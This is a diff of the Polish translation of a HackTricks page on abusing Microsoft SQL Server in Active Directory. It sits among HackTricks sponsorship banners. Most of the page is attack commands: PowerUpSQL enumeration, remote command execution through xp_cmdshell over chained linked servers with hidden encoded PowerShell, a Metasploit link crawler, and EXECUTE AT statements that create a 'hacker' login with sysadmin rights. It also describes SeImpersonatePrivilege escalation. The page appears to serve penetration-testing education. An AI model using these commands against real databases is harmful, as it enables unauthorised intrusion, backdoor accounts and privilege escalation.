@@ -1,28 +1,31 @@
-# Nadużycie MSSQL AD
+# MSSQL AD Abuse
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
-## **Eksploracja / Odkrywanie MSSQL**
+## **MSSQL Enumeration / Discovery**
 
 Moduł powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) jest bardzo przydatny w tym przypadku.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### Wyliczanie z sieci bez sesji domeny
+### Enumerowanie z sieci bez sesji domenowej
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -36,7 +39,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Wyliczanie z wnętrza domeny
+### Enumerowanie z wnętrza domeny
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -55,9 +58,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## Podstawowe nadużycie MSSQL
+## MSSQL Podstawowe Wykorzystanie
 
-### Dostęp do bazy danych
+### Dostęp do DB
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -71,22 +74,24 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Możliwe jest również **wykonanie poleceń** wewnątrz hosta MSSQL
+Może być również możliwe **wykonywanie poleceń** wewnątrz hosta MSSQL
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-### Podstawowe sztuczki hakowania MSSQL
+Check in the page mentioned in the **following section how to do this manually.**
+
+### MSSQL Podstawowe Techniki Hackingowe
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## Zaufane łącza MSSQL
+## MSSQL Zaufane Linki
 
-Jeśli instancja MSSQL jest zaufana (łącze bazy danych) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **wykorzystać relację zaufania do wykonywania zapytań również w innej instancji**. Te zaufania mogą być łańcuchowane, a w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, w której może wykonywać polecenia.
+Jeśli instancja MSSQL jest zaufana (link bazy danych) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **wykorzystać relację zaufania do wykonywania zapytań również w innej instancji**. Te zaufania mogą być łączone i w pewnym momencie użytkownik może być w stanie znaleźć źle skonfigurowaną bazę danych, w której może wykonywać polecenia.
 
-**Łącza między bazami danych działają nawet w przypadku zaufania między lasami.**
+**Linki między bazami danych działają nawet w przypadku zaufania między lasami.**
 
 ### Nadużycie Powershell
 ```powershell
@@ -122,23 +127,25 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Możesz łatwo sprawdzić zaufane linki za pomocą metasploita.
+Możesz łatwo sprawdzić zaufane linki za pomocą metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
+Zauważ, że metasploit spróbuje wykorzystać tylko funkcję `openquery()` w MSSQL (więc, jeśli nie możesz wykonać polecenia za pomocą `openquery()`, będziesz musiał spróbować metody `EXECUTE` **ręcznie**, aby wykonać polecenia, zobacz więcej poniżej.)
+
 ### Ręcznie - Openquery()
 
-Z systemu **Linux** możesz uzyskać konsolę powłoki MSSQL za pomocą **sqsh** i **mssqlclient.py**.
+Z **Linux** możesz uzyskać powłokę konsoli MSSQL za pomocą **sqsh** i **mssqlclient.py.**
 
-Z systemu **Windows** możesz również znaleźć linki i wykonywać polecenia ręcznie za pomocą klienta MSSQL, takiego jak [**HeidiSQL**](https://www.heidisql.com)
+Z **Windows** możesz również znaleźć linki i wykonać polecenia ręcznie, używając **klienta MSSQL, takiego jak** [**HeidiSQL**](https://www.heidisql.com)
 
-_Zaloguj się przy użyciu uwierzytelnienia systemu Windows:_
+_Zaloguj się za pomocą uwierzytelniania Windows:_
 
-![](<../../.gitbook/assets/image (808).png>) 
+![](<../../.gitbook/assets/image (808).png>)
 
-#### Znajdź godne zaufania linki
+#### Znajdź zaufane linki
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
@@ -147,17 +154,17 @@ EXEC sp_linkedservers;
 
 #### Wykonaj zapytania w zaufanym linku
 
-Wykonaj zapytania poprzez link (przykład: znajdź więcej linków w nowej dostępnej instancji):
+Wykonaj zapytania przez link (przykład: znajdź więcej linków w nowo dostępnym instancji):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Sprawdź, gdzie używane są cudzysłowy podwójne i pojedyncze, ważne jest, aby używać ich w ten sposób.
+Sprawdź, gdzie używane są podwójne i pojedyncze cudzysłowy, ważne jest, aby używać ich w ten sposób.
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (643).png>)
 
-Możesz kontynuować tę zaufaną łańcuchową listę linków w nieskończoność ręcznie.
+Możesz kontynuować tę ręcznie zaufaną sieć linków w nieskończoność.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -165,9 +172,11 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-### Instrukcja - EXECUTE
+Jeśli nie możesz wykonać akcji takich jak `exec xp_cmdshell` z `openquery()`, spróbuj metody `EXECUTE`.
 
-Możesz także nadużyć zaufanych łączy za pomocą `EXECUTE`:
+### Ręcznie - EXECUTE
+
+Możesz również nadużyć zaufanych linków używając `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -175,24 +184,27 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Eskalacja uprawnień lokalnych
 
-Użytkownik lokalny **MSSQL** zazwyczaj ma specjalny rodzaj uprawnienia o nazwie **`SeImpersonatePrivilege`**. Pozwala to na "podszycie się pod klienta po uwierzytelnieniu".
+**Użytkownik lokalny MSSQL** zazwyczaj ma specjalny rodzaj uprawnienia nazywanego **`SeImpersonatePrivilege`**. Umożliwia to kontu "podszywanie się pod klienta po uwierzytelnieniu".
 
-Strategią, którą wielu autorów wymyśliło, jest zmuszenie usługi SYSTEM do uwierzytelnienia się w fałszywej usłudze lub usłudze typu man-in-the-middle, którą tworzy atakujący. Ta fałszywa usługa jest w stanie podszycić się pod usługę SYSTEM podczas próby uwierzytelnienia.
+Strategią, którą opracowało wielu autorów, jest zmuszenie usługi SYSTEM do uwierzytelnienia się w fałszywej lub atakującej usłudze, którą tworzy napastnik. Ta fałszywa usługa jest w stanie podszywać się pod usługę SYSTEM, gdy ta próbuje się uwierzytelnić.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) zawiera zbiór różnych technik, które można wykonać za pomocą polecenia `execute-assembly` w Beacon.
+[SweetPotato](https://github.com/CCob/SweetPotato) ma zbiór tych różnych technik, które można wykonać za pomocą polecenia `execute-assembly` w Beaconie.
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
+{% hint style="success" %}
+Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Wsparcie dla HackTricks</summary>
 
-* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
 
 </details>
+{% endhint %}
